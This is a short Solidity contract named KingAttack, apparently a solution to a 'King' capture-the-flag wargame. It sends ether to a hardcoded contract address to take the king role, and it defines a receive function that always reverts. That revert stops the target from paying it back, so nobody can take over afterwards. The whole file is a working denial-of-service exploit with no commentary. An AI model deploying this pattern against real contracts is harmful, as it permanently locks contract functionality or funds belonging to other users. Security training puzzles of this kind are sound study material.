// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    address king = address(0xd4bFc0c824df4D4c7f2b9c52b8ca5cDBc4785e51);

    function attack(uint256 val) public payable {
        (bool success, ) = king.call{value: val}("");
        require(success, "Failed to send value!");
    }

    receive() external payable {
        revert("you are not the king");
    }
}
